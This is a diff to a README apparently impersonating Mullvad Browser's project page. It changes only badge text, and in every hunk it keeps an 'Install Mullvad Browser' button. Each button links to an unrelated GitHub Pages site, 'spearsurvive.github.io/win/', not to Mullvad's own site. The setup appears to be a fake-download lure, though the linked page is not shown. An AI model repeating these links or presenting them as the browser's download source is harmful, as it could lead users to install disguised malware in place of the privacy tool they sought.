@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad%20Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad+Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Mullvad Browser is a privacy-focused web browser developed jointly by Mullvad VP
 
 <div align="center">
 
-[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad%20Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad+Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Mullvad Browser is a privacy-focused web browser developed jointly by Mullvad VP
 
 <div align="center">
 
-[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad%20Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Mullvad Browser](https://img.shields.io/badge/⬇_Install_Mullvad+Browser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
